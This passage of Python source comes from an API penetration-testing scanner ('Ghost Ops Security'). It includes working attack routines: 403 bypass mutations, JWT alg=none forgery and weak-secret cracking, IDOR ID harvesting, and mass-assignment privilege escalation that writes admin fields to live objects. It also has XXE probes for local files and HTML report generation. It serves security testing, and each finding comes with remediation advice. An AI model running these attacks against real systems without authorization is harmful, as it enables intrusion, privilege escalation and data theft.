                    return
            except Exception:
                pass

        # -- Path-mutation bypasses -----------------------------------
        for mutation in self.PATH_BYPASS_MUTATIONS:
            mutated = mutation.replace('{path}', path).replace('{PATH_UPPER}', path.upper())
            try:
                response = self.session.request(
                    endpoint_data['method'], f"{self.base_url}{mutated}",
                    timeout=10, verify=False, allow_redirects=False, proxies=self.proxy)
                if response.status_code in (200, 201, 204):
                    self._add_finding(
                        endpoint=path, method=endpoint_data['method'],
                        vuln_type='Access Control Bypass via Path Mutation', severity='CRITICAL',
                        description=f'{endpoint_data["status"]} gate bypassed by requesting "{mutated}"',
                        payload=mutated, response_code=response.status_code,
                        evidence=f'HTTP {endpoint_data["status"]} became {response.status_code}',
                        remediation='Normalize paths before ACL checks; deny by default on ambiguous parses.'
                    )
                    print(f"{Colors.RED}[!] 403 bypass via path mutation: {mutated}{Colors.END}")
                    return
            except Exception:
                pass

    def test_http_method_override(self, endpoint_data: Dict):
        """Test X-HTTP-Method-Override acceptance -- lets POST masquerade as DELETE/PUT"""
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        override_headers = ['X-HTTP-Method-Override', 'X-HTTP-Method', 'X-Method-Override']

        for header in override_headers:
            try:
                # Send POST claiming to be DELETE; if response differs from a
                # plain POST *and* from a real DELETE 405, the override is honored.
                plain = self.session.post(url, timeout=10, verify=False,
                                          allow_redirects=False, proxies=self.proxy)
                overridden = self.session.post(url, headers={header: 'DELETE'}, timeout=10,
                                               verify=False, allow_redirects=False, proxies=self.proxy)
                if (overridden.status_code != plain.status_code
                        and overridden.status_code not in (400, 404, 405, 501)):
                    self._add_finding(
                        endpoint=endpoint_data['endpoint'], method='POST',
                        vuln_type='HTTP Method Override Honored', severity='HIGH',
                        description=f'{header}: DELETE changes server behavior on POST -- method-scoped ACLs can be sidestepped',
                        payload=f'{header}: DELETE', response_code=overridden.status_code,
                        evidence=f'POST={plain.status_code} vs POST+override={overridden.status_code}',
                        remediation='Disable method-override middleware or enforce authorization on the effective method.'
                    )
                    print(f"{Colors.RED}[!] Method override honored via {header}{Colors.END}")
                    return
            except Exception:
                pass

    def test_cors_misconfiguration(self):
        """Check for reflected-Origin / wildcard-with-credentials CORS policies"""
        print(f"{Colors.YELLOW}[*] Testing CORS policy...{Colors.END}")
        evil_origin = 'https://evil.ghostops-test.com'
        try:
            response = self.session.get(self.base_url, headers={'Origin': evil_origin},
                                        timeout=10, verify=False, proxies=self.proxy)
            allow_origin = response.headers.get('Access-Control-Allow-Origin', '')
            allow_creds = response.headers.get('Access-Control-Allow-Credentials', '').lower() == 'true'

            if allow_origin == evil_origin:
                severity = 'HIGH' if allow_creds else 'MEDIUM'
                self._add_finding(
                    endpoint=self.base_url, method='GET',
                    vuln_type='CORS Origin Reflection', severity=severity,
                    description='Arbitrary Origin reflected in Access-Control-Allow-Origin'
                                + (' WITH credentials allowed' if allow_creds else ''),
                    payload=f'Origin: {evil_origin}', response_code=response.status_code,
                    evidence=f'ACAO: {allow_origin}, ACAC: {allow_creds}',
                    remediation='Whitelist exact trusted origins; never reflect the request Origin with credentials enabled.'
                )
                print(f"{Colors.RED}[!] CORS reflects arbitrary Origin (credentials={allow_creds}){Colors.END}")
            elif allow_origin == '*' and allow_creds:
                self._add_finding(
                    endpoint=self.base_url, method='GET',
                    vuln_type='CORS Wildcard with Credentials', severity='MEDIUM',
                    description='Access-Control-Allow-Origin: * combined with credentials',
                    payload=f'Origin: {evil_origin}', response_code=response.status_code,
                    evidence='ACAO: *, ACAC: true',
                    remediation='Remove Access-Control-Allow-Credentials or restrict origins.'
                )
                print(f"{Colors.YELLOW}[!] CORS wildcard with credentials{Colors.END}")
        except Exception:
            pass

    def test_verbose_errors(self, endpoint_data: Dict):
        """Send malformed bodies and look for stack traces / debug output"""
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        malformed_bodies = [
            ('{"broken":', 'application/json'),
            ('<' * 50, 'application/json'),
            ('a' * 20000, 'application/json'),
            ('{"a": 1e99999}', 'application/json'),
        ]
        for body, content_type in malformed_bodies:
            try:
                response = self.session.post(url, data=body,
                                             headers={'Content-Type': content_type},
                                             timeout=10, verify=False, proxies=self.proxy)
                for pattern, tech in self.STACK_TRACE_PATTERNS:
                    if pattern in response.text:
                        self.tech_fingerprints.add(f'stack trace: {tech}')
                        self._add_finding(
                            endpoint=endpoint_data['endpoint'], method='POST',
                            vuln_type='Verbose Error / Stack Trace Disclosure', severity='MEDIUM',
                            description=f'Malformed input triggers a {tech} stack trace',
                            payload=body[:80], response_code=response.status_code,
                            evidence=f'Pattern: {pattern}',
                            remediation='Return generic error bodies; log details server-side only.'
                        )
                        print(f"{Colors.YELLOW}[!] {tech} stack trace disclosed by {endpoint_data['endpoint']}{Colors.END}")
                        return
            except Exception:
                pass

    def test_jwt_attacks(self):
        """Extended JWT battery: none-variants, blank signature, weak HS256 secrets"""
        auth_header = self.headers.get('Authorization') or self.headers.get('authorization', '')
        if 'Bearer' not in auth_header:
            return
        token = auth_header.split('Bearer', 1)[1].strip()
        parts = token.split('.')
        if len(parts) != 3:
            return

        print(f"{Colors.CYAN}[*] Testing JWT attack vectors (none-variants, weak secrets)...{Colors.END}")

        def b64url_decode(segment: str) -> bytes:
            return base64.urlsafe_b64decode(segment + '=' * (-len(segment) % 4))

        def b64url_encode(raw: bytes) -> str:
            return base64.urlsafe_b64encode(raw).decode().rstrip('=')

        try:
            header = json.loads(b64url_decode(parts[0]))
            payload_claims = json.loads(b64url_decode(parts[1]))
        except Exception:
            return

        # -- Weak HS256 secret check (offline, no requests needed) -----
        if header.get('alg', '').upper() == 'HS256':
            signing_input = f'{parts[0]}.{parts[1]}'.encode()
            provided_sig = parts[2]
            for secret in self.payloads['weak_jwt_secrets']:
                candidate = b64url_encode(hmac.new(secret.encode(), signing_input, hashlib.sha256).digest())
                if hmac.compare_digest(candidate, provided_sig):
                    self._add_finding(
                        endpoint=self.base_url, method='N/A',
                        vuln_type='JWT Signed with Weak Secret', severity='CRITICAL',
                        description=f'Session JWT is signed with the guessable secret "{secret}" -- tokens can be forged offline',
                        payload=f'HS256 secret: {secret}', response_code=0,
                        evidence='Recomputed signature matches the live token',
                        remediation='Use a long random signing key (or asymmetric RS256/ES256); rotate immediately.'
                    )
                    print(f"{Colors.RED}[!] JWT secret cracked: \"{secret}\" -- tokens forgeable{Colors.END}")
                    break

        # -- alg:none variants against live endpoints ------------------
        forged_claims = dict(payload_claims)
        for key in ('role', 'roles', 'isAdmin', 'is_admin', 'admin', 'scope'):
            if key in forged_claims:
                forged_claims[key] = 'admin' if isinstance(forged_claims[key], str) else True
        none_variants = ['none', 'None', 'NONE', 'nOnE']
        targets = [e for e in self.endpoints if e.get('status') in (200, 201)][:5]

        for variant in none_variants:
            forged = (b64url_encode(json.dumps({'alg': variant, 'typ': 'JWT'}).encode())
                      + '.' + b64url_encode(json.dumps(forged_claims).encode()) + '.')
            test_headers = self.headers.copy()
            test_headers['Authorization'] = f'Bearer {forged}'
            for endpoint_data in targets:
                try:
                    response = self.session.request(
                        endpoint_data['method'], f"{self.base_url}{endpoint_data['endpoint']}",
                        headers=test_headers, timeout=10, verify=False, proxies=self.proxy)
                    if response.status_code in (200, 201, 204):
                        self._add_finding(
                            endpoint=endpoint_data['endpoint'], method=endpoint_data['method'],
                            vuln_type='JWT Algorithm Confusion (alg=none)', severity='CRITICAL',
                            description=f'Unsigned JWT with alg="{variant}" and escalated claims accepted',
                            payload=forged[:120], response_code=response.status_code,
                            evidence=f'alg={variant} token accepted with modified claims',
                            remediation='Pin the expected algorithm server-side; reject unsigned tokens.'
                        )
                        print(f"{Colors.RED}[!] alg={variant} JWT accepted on {endpoint_data['endpoint']}{Colors.END}")
                        return
                except Exception:
                    pass

    # ==================================================================
    # Attack chains -- multi-step scenarios that mirror real API abuse
    # ==================================================================

    def run_attack_chains(self):
        """Execute multi-step attack chains against the discovered surface"""
        print(f"\n{Colors.BOLD}[+] Phase 4: Attack Chain Execution{Colors.END}")
        self.chain_unauth_replay()
        self.chain_idor_harvest()
        self.chain_mass_assignment_persist()

    def chain_unauth_replay(self):
        """
        Chain 1 (Broken Authentication): replay every endpoint that answered
        200 WITH credentials, using a bare session with no auth headers or
        cookies. A matching response means the credential check is cosmetic.
        """
        if not self.headers and not self.cookies:
            print(f"{Colors.YELLOW}[*] Chain 1 (unauth replay): skipped -- no credentials were supplied to strip{Colors.END}")
            return

        print(f"{Colors.CYAN}[*] Chain 1: Unauthenticated replay of authenticated endpoints...{Colors.END}")
        bare = requests.Session()

        authed_ok = [e for e in self.endpoints if e.get('status') in (200, 201)][:20]
        for endpoint_data in authed_ok:
            try:
                response = bare.request(
                    endpoint_data['method'], f"{self.base_url}{endpoint_data['endpoint']}",
                    timeout=10, verify=False, allow_redirects=False, proxies=self.proxy)
                if response.status_code in (200, 201, 204):
                    same_shape = abs(len(response.content) - endpoint_data.get('length', 0)) < 30
                    self._add_finding(
                        endpoint=endpoint_data['endpoint'], method=endpoint_data['method'],
                        vuln_type='Broken Authentication (Unauthenticated Access)',
                        severity='CRITICAL' if same_shape else 'HIGH',
                        description='Endpoint returns success without any credentials',
                        payload='(auth headers and cookies stripped)', response_code=response.status_code,
                        evidence=f'Unauth {response.status_code}, {len(response.content)} bytes '
                                 f'(authed was {endpoint_data.get("length", "?")} bytes)',
                        remediation='Enforce authentication on every route server-side; deny by default.'
                    )
                    print(f"{Colors.RED}[!] No auth required: {endpoint_data['method']} {endpoint_data['endpoint']}{Colors.END}")
            except Exception:
                pass

    def chain_idor_harvest(self):
        """
        Chain 2 (BOLA/IDOR): IDs harvested from real responses are substituted
        into object-style paths (/api/users/<id>), plus numeric neighbors of
        each harvested ID. Distinct 200-bodies across IDs = object-level
        authorization failure.
        """
        print(f"{Colors.CYAN}[*] Chain 2: BOLA/IDOR harvest -- {len(self.harvested_ids)} IDs collected during discovery...{Colors.END}")

        # Build candidate IDs: harvested + numeric neighbors
        candidates = set(list(self.harvested_ids)[:15])
        for harvested in list(self.harvested_ids)[:10]:
            if str(harvested).isdigit():
                value = int(harvested)
                candidates.update(str(v) for v in (value - 1, value + 1) if v >= 0)
        if not candidates:
            candidates = {'1', '2', '3'}

        collection_endpoints = [e for e in self.endpoints
                                if e['method'] == 'GET' and e.get('status') == 200
                                and re.search(r'/(users|orders|accounts|products|documents|files|invoices|profiles|customers)$',
                                              e['endpoint'])][:5]
        if not collection_endpoints:
            print(f"{Colors.YELLOW}[*] No collection-style endpoints to pivot on -- skipping{Colors.END}")
            return

        for endpoint_data in collection_endpoints:
            bodies = {}
            for object_id in sorted(candidates)[:8]:
                object_path = f"{endpoint_data['endpoint']}/{object_id}"
                try:
                    response = self.session.get(f"{self.base_url}{object_path}",
                                                timeout=10, verify=False, proxies=self.proxy)
                    if response.status_code == 200 and response.content:
                        bodies[object_path] = response.content[:500]
                except Exception:
                    pass
            distinct = len(set(bodies.values()))
            if distinct > 1:
                self._add_finding(
                    endpoint=endpoint_data['endpoint'] + '/{id}', method='GET',
                    vuln_type='BOLA / IDOR via Harvested Object IDs', severity='HIGH',
                    description=f'{distinct} distinct objects readable by iterating IDs harvested from API responses',
                    payload=', '.join(list(bodies.keys())[:5]), response_code=200,
                    evidence=f'{len(bodies)} object fetches succeeded with {distinct} distinct bodies',
                    remediation='Check object ownership on every fetch; use non-guessable IDs as defense in depth.'
                )
                print(f"{Colors.RED}[!] BOLA chain: {distinct} distinct objects readable under {endpoint_data['endpoint']}/{{id}}{Colors.END}")

    def chain_mass_assignment_persist(self):
        """
        Chain 3 (Mass Assignment, verified): GET an object, inject privilege
        fields, write it back with PUT/PATCH, then GET it AGAIN to confirm the
        escalation persisted -- reflection alone can be a false positive.
        """
        print(f"{Colors.CYAN}[*] Chain 3: Mass-assignment persistence (GET -> tamper -> PUT -> GET)...{Colors.END}")

        writable = [e for e in self.endpoints
                    if e.get('has_json') and isinstance(e.get('json_data'), dict)
                    and e['method'] == 'GET' and e.get('status') == 200][:5]
        if not writable:
            print(f"{Colors.YELLOW}[*] No JSON GET endpoints to pivot on -- skipping{Colors.END}")
            return

        privilege_fields = {'role': 'admin', 'is_admin': True, 'isAdmin': True, 'verified': True}

        for endpoint_data in writable:
            url = f"{self.base_url}{endpoint_data['endpoint']}"
            tampered = copy.deepcopy(endpoint_data['json_data'])
            tampered.update(privilege_fields)

            for write_method in ('PUT', 'PATCH'):
                try:
                    write_response = self.session.request(write_method, url, json=tampered,
                                                          timeout=10, verify=False, proxies=self.proxy)
                    if write_response.status_code not in (200, 201, 204):
                        continue
                    # Verification read
                    verify_response = self.session.get(url, timeout=10, verify=False, proxies=self.proxy)
                    try:
                        current = verify_response.json()
                    except ValueError:
                        continue
                    persisted = [k for k, v in privilege_fields.items()
                                 if isinstance(current, dict) and current.get(k) == v
                                 and endpoint_data['json_data'].get(k) != v]
                    if persisted:
                        self._add_finding(
                            endpoint=endpoint_data['endpoint'], method=write_method,
                            vuln_type='Mass Assignment (Persisted Privilege Escalation)', severity='CRITICAL',
                            description=f'Privilege fields {persisted} written via {write_method} and confirmed on re-read',
                            payload=json.dumps({k: privilege_fields[k] for k in persisted}),
                            response_code=write_response.status_code,
                            evidence=f'Fields {persisted} persisted across GET -> {write_method} -> GET',
                            remediation='Bind writes to an explicit allow-list DTO; never merge raw request bodies into models.'
                        )
                        print(f"{Colors.RED}[!] Mass assignment PERSISTED on {endpoint_data['endpoint']}: {persisted}{Colors.END}")
                        break
                except Exception:
                    pass

    def test_security_headers(self):
        """Test for missing security headers"""
        print(f"\n{Colors.YELLOW}[*] Testing Security Headers...{Colors.END}")
        
        try:
            response = self.session.get(self.base_url, timeout=10, verify=False, proxies=self.proxy)
            
            security_headers = {
                'X-Frame-Options': 'Clickjacking protection',
                'X-Content-Type-Options': 'MIME-sniffing protection',
                'Strict-Transport-Security': 'HTTPS enforcement',
                'Content-Security-Policy': 'XSS protection',
                'X-XSS-Protection': 'XSS filter',
                'Referrer-Policy': 'Referrer leakage protection'
            }
            
            missing_headers = []
            for header, description in security_headers.items():
                if header not in response.headers:
                    missing_headers.append(f"{header} ({description})")
            
            if missing_headers:
                self._add_finding(
                    endpoint=self.base_url,
                    method='GET',
                    vuln_type='Missing Security Headers',
                    severity='MEDIUM',
                    description='Critical security headers are missing',
                    payload='N/A',
                    response_code=response.status_code,
                    evidence=f"Missing headers: {', '.join(missing_headers)}",
                    remediation='Implement all security headers with appropriate values.'
                )
                print(f"{Colors.YELLOW}[!] Missing security headers detected{Colors.END}")
        
        except Exception:
            pass

    def test_xxe(self, endpoint_data: Dict):
        """Test for XML External Entity vulnerabilities"""
        if 'xml' not in endpoint_data.get('content_type', '').lower():
            return
        
        print(f"{Colors.YELLOW}[*] Testing XXE...{Colors.END}")
        
        url = f"{self.base_url}{endpoint_data['endpoint']}"
        
        for payload in self.payloads['xxe']:
            try:
                headers = self.headers.copy()
                headers['Content-Type'] = 'application/xml'
                
                response = self.session.request(
                    endpoint_data['method'],
                    url,
                    data=payload,
                    headers=headers,
                    timeout=10,
                    verify=False,
                    proxies=self.proxy
                )
                
                xxe_patterns = ['root:', 'bin:', 'daemon:', '[boot loader]']
                
                for pattern in xxe_patterns:
                    if pattern in response.text:
                        self._add_finding(
                            endpoint=endpoint_data['endpoint'],
                            method=endpoint_data['method'],
                            vuln_type='XML External Entity (XXE)',
                            severity='CRITICAL',
                            description='XXE vulnerability allows reading local files',
                            payload=payload[:100] + '...',
                            response_code=response.status_code,
                            evidence=f'Local file content detected: {pattern}',
                            remediation='Disable external entity processing in XML parser. Use less complex data formats like JSON.'
                        )
                        print(f"{Colors.RED}[!] XXE vulnerability found{Colors.END}")
                        break
            
            except Exception:
                pass

    def _add_finding(self, endpoint: str, method: str, vuln_type: str, severity: str,
                     description: str, payload: str, response_code: int, evidence: str, 
                     remediation: str, manipulation_details: str = ""):
        """Add a finding to the results"""
        finding = Finding(
            endpoint=endpoint,
            method=method,
            vulnerability_type=vuln_type,
            severity=severity,
            description=description,
            payload=payload,
            response_code=response_code,
            evidence=evidence,
            remediation=remediation,
            timestamp=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            manipulation_details=manipulation_details
        )
        self.findings.append(finding)

    def run_full_scan(self, wordlist: List[str] = None):
        """Execute complete vulnerability scan"""
        self.print_banner()

        # Phase 0: Passive recon -- fingerprints, CORS, robots.txt, API specs
        extra_paths = self.recon_target()

        # Phase 1: Discovery (wordlist + spec/robots-derived paths)
        self.discover_endpoints(wordlist, extra_paths=extra_paths)

        if not self.endpoints:
            print(f"{Colors.RED}[!] No endpoints discovered. Exiting.{Colors.END}")
            return

        # Phase 1b: Shadow/legacy API version sweep
        self.enumerate_api_versions()

        # Phase 2/3: Per-endpoint vulnerability testing
        print(f"\n{Colors.BOLD}[+] Phase 3: OWASP API Top 10 Vulnerability Testing{Colors.END}")

        for endpoint_data in self.endpoints:
            print(f"\n{Colors.CYAN}[*] Testing: {endpoint_data['method']} {endpoint_data['endpoint']}{Colors.END}")

            # Gated endpoints get the bypass battery instead of param fuzzing
            self.test_403_bypass(endpoint_data)

            # Fuzz parameters
            params = self.fuzz_parameters(endpoint_data)

            if params:
                # Run all vulnerability tests
                self.test_sql_injection(endpoint_data, params)
                self.test_nosql_injection(endpoint_data, params)
                self.test_xss(endpoint_data, params)
                self.test_ssti(endpoint_data, params)
                self.test_command_injection(endpoint_data, params)
                self.test_path_traversal(endpoint_data, params)
                self.test_ssrf(endpoint_data, params)
                self.test_idor(endpoint_data, params)

            # Body/method-level tests that don't need fuzzed params
            self.test_xxe(endpoint_data)
            self.test_http_method_override(endpoint_data)
            self.test_verbose_errors(endpoint_data)

            # Test API data manipulation for POST/PUT/PATCH endpoints with JSON
            if endpoint_data.get('has_json'):
                self.test_api_data_manipulation(endpoint_data)

        # Phase 3b: API-wide tests
        self.test_graphql_introspection()
        self.test_authentication_bypass()
        self.test_jwt_attacks()
        self.test_rate_limiting()
        self.test_security_headers()

        # Phase 4: Multi-step attack chains
        if self.skip_chains:
            print(f"\n{Colors.YELLOW}[*] Attack chains skipped (--skip-chains){Colors.END}")
        else:
            self.run_attack_chains()

        # Generate report
        self.generate_report()

    def generate_report(self):
        """Generate comprehensive findings report"""
        print(f"\n{Colors.BOLD}{'='*100}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}                              VULNERABILITY ASSESSMENT REPORT{Colors.END}")
        print(f"{Colors.BOLD}{'='*100}{Colors.END}\n")
        
        if not self.findings:
            print(f"{Colors.GREEN}[+] No vulnerabilities detected!{Colors.END}\n")
            return
        
        # Sort findings by severity
        severity_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
        sorted_findings = sorted(self.findings, key=lambda x: severity_order.get(x.severity, 999))
        
        # Summary statistics
        summary = {
            'CRITICAL': len([f for f in self.findings if f.severity == 'CRITICAL']),
            'HIGH': len([f for f in self.findings if f.severity == 'HIGH']),
            'MEDIUM': len([f for f in self.findings if f.severity == 'MEDIUM']),
            'LOW': len([f for f in self.findings if f.severity == 'LOW'])
        }
        
        print(f"{Colors.BOLD}EXECUTIVE SUMMARY{Colors.END}")
        print(f"{'─'*100}")
        print(f"Target: {self.base_url}")
        print(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Total Vulnerabilities: {len(self.findings)}")
        print(f"Endpoints Analyzed: {len(self.endpoints)}")
        print(f"JSON Patterns Discovered: {len(self.json_patterns)}")
        print(f"\n{Colors.RED}Critical: {summary['CRITICAL']}{Colors.END} | " +
              f"{Colors.YELLOW}High: {summary['HIGH']}{Colors.END} | " +
              f"{Colors.CYAN}Medium: {summary['MEDIUM']}{Colors.END} | " +
              f"{Colors.WHITE}Low: {summary['LOW']}{Colors.END}\n")
        
        # Detailed findings table
        print(f"{Colors.BOLD}DETAILED FINDINGS{Colors.END}")
        print(f"{'─'*100}")
        
        # Table header
        header = f"{'#':<4} {'SEVERITY':<10} {'TYPE':<35} {'ENDPOINT':<40} {'METHOD':<8}"
        print(f"{Colors.BOLD}{header}{Colors.END}")
        print(f"{'─'*100}")
        
        # Table rows
        for idx, finding in enumerate(sorted_findings, 1):
            severity_color = {
                'CRITICAL': Colors.RED,
                'HIGH': Colors.YELLOW,
                'MEDIUM': Colors.CYAN,
                'LOW': Colors.WHITE
            }.get(finding.severity, Colors.WHITE)
            
            row = f"{idx:<4} {severity_color}{finding.severity:<10}{Colors.END} " +\
                  f"{finding.vulnerability_type:<35} {finding.endpoint[:38]:<40} {finding.method:<8}"
            print(row)
        
        print(f"\n{'='*100}\n")
        
        # Detailed vulnerability information
        print(f"{Colors.BOLD}VULNERABILITY DETAILS{Colors.END}\n")
        
        for idx, finding in enumerate(sorted_findings, 1):
            severity_color = {
                'CRITICAL': Colors.RED,
                'HIGH': Colors.YELLOW,
                'MEDIUM': Colors.CYAN,
                'LOW': Colors.WHITE
            }.get(finding.severity, Colors.WHITE)
            
            print(f"{Colors.BOLD}[{idx}] {severity_color}{finding.severity}{Colors.END} - {Colors.BOLD}{finding.vulnerability_type}{Colors.END}")
            print(f"{'─'*100}")
            print(f"Endpoint:      {finding.method} {finding.endpoint}")
            print(f"Description:   {finding.description}")
            print(f"Evidence:      {finding.evidence}")
            print(f"Payload:       {finding.payload[:150]}{'...' if len(finding.payload) > 150 else ''}")
            print(f"HTTP Code:     {finding.response_code}")
            print(f"Timestamp:     {finding.timestamp}")
            if finding.manipulation_details:
                print(f"Manipulation:  {finding.manipulation_details}")
            print(f"\n{Colors.CYAN}Remediation:{Colors.END}")
            print(f"  {finding.remediation}")
            print(f"\n{'─'*100}\n")
        
        # Save to file
        self._save_report_to_file(sorted_findings, summary)

    def _save_report_to_file(self, sorted_findings: List[Finding], summary: Dict):
        """Save findings to JSON and HTML files"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        os.makedirs(self.output_dir, exist_ok=True)

        # JSON Report
        json_filename = os.path.join(self.output_dir, f"api_scan_{timestamp}.json")
        json_data = {
            'scan_info': {
                'target': self.base_url,
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'total_vulnerabilities': len(self.findings),
                'endpoints_analyzed': len(self.endpoints),
                'json_patterns_discovered': len(self.json_patterns),
                'cookies_used': bool(self.cookies),
                'tech_fingerprints': sorted(self.tech_fingerprints),
                'api_specs_found': self.api_schemas,
                'harvested_object_ids': len(self.harvested_ids)
            },
            'summary': summary,
            'findings': [asdict(f) for f in sorted_findings],
            'json_patterns': self.json_patterns[:10]  # Include first 10 patterns
        }

        with open(json_filename, 'w') as f:
            json.dump(json_data, f, indent=2)

        # HTML Report
        html_filename = os.path.join(self.output_dir, f"api_scan_{timestamp}.html")
        html_content = self._generate_html_report(sorted_findings, summary)
        
        with open(html_filename, 'w') as f:
            f.write(html_content)
        
        print(f"{Colors.GREEN}[+] Reports saved:{Colors.END}")
        print(f"    JSON: {json_filename}")
        print(f"    HTML: {html_filename}\n")

    def _generate_html_report(self, sorted_findings: List[Finding], summary: Dict) -> str:
        """Generate HTML report"""
        html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>API Vulnerability Scan Report - Ghost Ops Security</title>
    <style>
        body {{ font-family: 'Segoe UI', Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .container {{ max-width: 1400px; margin: 0 auto; background: white; padding: 30px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }}
        h1 {{ color: #2c3e50; border-bottom: 3px solid #3498db; padding-bottom: 10px; }}
        h2 {{ color: #34495e; margin-top: 30px; }}
        .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; margin: -30px -30px 30px -30px; }}
        .summary {{ display: flex; justify-content: space-around; margin: 20px 0; }}
        .summary-box {{ padding: 20px; border-radius: 5px; text-align: center; flex: 1; margin: 0 10px; }}
        .critical {{ background: #e74c3c; color: white; }}
        .high {{ background: #e67e22; color: white; }}
        .medium {{ background: #f39c12; color: white; }}
        .low {{ background: #95a5a6; color: white; }}
        .summary-box h3 {{ margin: 0; font-size: 36px; }}
        .summary-box p {{ margin: 5px 0 0 0; }}
        table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
        th {{ background: #34495e; color: white; padding: 12px; text-align: left; }}
        td {{ padding: 10px; border-bottom: 1px solid #ddd; }}
        tr:hover {{ background: #f8f9fa; }}
        .vuln-detail {{ margin: 20px 0; padding: 20px; border-left: 4px solid #3498db; background: #ecf0f1; }}
        .severity-badge {{ padding: 5px 10px; border-radius: 3px; color: white; font-weight: bold; }}
        .code {{ background: #2c3e50; color: #ecf0f1; padding: 10px; border-radius: 3px; overflow-x: auto; font-family: monospace; }}
        .manipulation {{ background: #3498db; color: white; padding: 8px; margin: 5px 0; border-radius: 3px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ API Vulnerability Assessment Report v2.0</h1>
            <p><strong>Ghost Ops Security</strong> - Advanced API Testing with Pattern Analysis</p>
            <p>Target: {self.base_url}</p>
            <p>Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p>Endpoints Analyzed: {len(self.endpoints)} | JSON Patterns: {len(self.json_patterns)}</p>
        </div>
        
        <h2>Executive Summary</h2>
        <div class="summary">
            <div class="summary-box critical">
                <h3>{summary['CRITICAL']}</h3>
                <p>Critical</p>
            </div>
            <div class="summary-box high">
                <h3>{summary['HIGH']}</h3>
                <p>High</p>
            </div>
            <div class="summary-box medium">
                <h3>{summary['MEDIUM']}</h3>
                <p>Medium</p>
            </div>
            <div class="summary-box low">
                <h3>{summary['LOW']}</h3>
                <p>Low</p>
            </div>
        </div>
        
        <h2>Findings Overview</h2>
        <table>
            <tr>
                <th>#</th>
                <th>Severity</th>
                <th>Vulnerability Type</th>
                <th>Endpoint</th>
                <th>Method</th>
            </tr>
"""
        
        for idx, finding in enumerate(sorted_findings, 1):
            severity_class = finding.severity.lower()
            html += f"""
            <tr>
                <td>{idx}</td>
                <td><span class="severity-badge {severity_class}">{finding.severity}</span></td>
                <td>{finding.vulnerability_type}</td>
                <td>{finding.endpoint}</td>
                <td>{finding.method}</td>
            </tr>
"""
        
        html += """
        </table>
        
        <h2>Detailed Findings</h2>
"""
        
        for idx, finding in enumerate(sorted_findings, 1):
            severity_class = finding.severity.lower()
            manipulation_html = ""
            if finding.manipulation_details:
                manipulation_html = f'<div class="manipulation"><strong>Data Manipulation:</strong> {finding.manipulation_details}</div>'
            
            html += f"""
        <div class="vuln-detail">
            <h3>[{idx}] <span class="severity-badge {severity_class}">{finding.severity}</span> {finding.vulnerability_type}</h3>
            <p><strong>Endpoint:</strong> {finding.method} {finding.endpoint}</p>
            <p><strong>Description:</strong> {finding.description}</p>
            <p><strong>Evidence:</strong> {finding.evidence}</p>
            {manipulation_html}
            <p><strong>Payload:</strong></p>
            <div class="code">{finding.payload[:300]}{'...' if len(finding.payload) > 300 else ''}</div>
            <p><strong>HTTP Response Code:</strong> {finding.response_code}</p>
            <p><strong>Timestamp:</strong> {finding.timestamp}</p>
            <p><strong>Remediation:</strong> {finding.remediation}</p>
        </div>
"""
        
        html += """
    </div>
</body>
</html>
"""
        return html


def main():
    banner = f"{Colors.ORANGE}{GHOST_BANNER}{Colors.END}{Colors.GREY}{GHOST_TAGLINE}{Colors.END}\n"
    
    parser = argparse.ArgumentParser(
        description=banner,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{Colors.CYAN}{Colors.BOLD}═══════════════════════════════════════════════════════════════════════════
USAGE EXAMPLES
═══════════════════════════════════════════════════════════════════════════{Colors.END}

{Colors.GREEN}Basic Scan:{Colors.END}
  python3 %(prog)s -u https://api.example.com

{Colors.GREEN}With JWT Authentication:{Colors.END}
  python3 %(prog)s -u https://api.example.com \\
    -H "Authorization: Bearer eyJhbGc..."

{Colors.GREEN}With Cookie Authentication:{Colors.END}
  python3 %(prog)s -u https://api.example.com \\
    --cookie "session=abc123;PHPSESSID=xyz789"

{Colors.GREEN}With Multiple Headers:{Colors.END}
  python3 %(prog)s -u https://api.example.com \\
    -H "Authorization: Bearer TOKEN" \\
    -H "X-API-Key: your-key" \\
    -H "Content-Type: application/json"

{Colors.GREEN}Complete E-commerce Pentest:{Colors.END}
  python3 %(prog)s -u https://api.shop.com \\
    -H "Authorization: Bearer TOKEN" \\
    --cookie "cart=xyz;session=abc" \\
    -w endpoints.txt \\
    -t 15 \\
    --proxy http://127.0.0.1:8080

{Colors.GREEN}Through Burp Suite:{Colors.END}
  python3 %(prog)s -u https://api.example.com \\
    -H "Authorization: Bearer TOKEN" \\
    --proxy http://127.0.0.1:8080

{Colors.CYAN}{Colors.BOLD}═══════════════════════════════════════════════════════════════════════════
KEY FEATURES
═══════════════════════════════════════════════════════════════════════════{Colors.END}

{Colors.YELLOW}✓{Colors.END} JSON Pattern Analysis         - Intelligent field discovery
{Colors.YELLOW}✓{Colors.END} API Data Manipulation         - Automated exploitation (50+ tests)
{Colors.YELLOW}✓{Colors.END} Cookie Authentication         - Session-based auth support
{Colors.YELLOW}✓{Colors.END} GraphQL Security Testing      - Schema introspection & queries
{Colors.YELLOW}✓{Colors.END} JWT Attack Vectors            - Algorithm confusion & tampering
{Colors.YELLOW}✓{Colors.END} OWASP API Top 10 2023         - Complete coverage
{Colors.YELLOW}✓{Colors.END} Business Logic Testing        - Price/privilege manipulation
{Colors.YELLOW}✓{Colors.END} Professional Reporting        - HTML, JSON, Console output

{Colors.CYAN}{Colors.BOLD}═══════════════════════════════════════════════════════════════════════════
VULNERABILITY DETECTION
═══════════════════════════════════════════════════════════════════════════{Colors.END}

{Colors.RED}CRITICAL:{Colors.END}  SQL Injection • Command Injection • SSRF • XXE
